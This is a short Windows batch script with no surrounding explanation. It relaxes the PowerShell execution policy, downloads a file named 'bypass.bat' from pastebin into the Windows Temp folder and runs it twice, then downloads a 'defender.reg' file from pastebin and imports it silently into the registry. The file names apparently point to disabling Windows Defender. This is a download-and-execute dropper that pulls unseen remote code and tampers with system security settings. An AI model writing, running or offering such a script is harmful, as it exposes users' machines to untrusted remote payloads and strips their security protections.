@echo off
powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
powershell -c "curl https://pastebin.com/bxeb8rF4 -O C:\Windows\Temp\bypass.bat"
cmd /c "C:\Windows\Temp\bypass.bat"
cmd /c "C:\Windows\Temp\bypass.bat"
powershell -c "curl https://pastebin.com/hYpc8qH9 -O C:\Windows\Temp\defender.reg"
regedit /s "\Windows\Temp\defender.reg"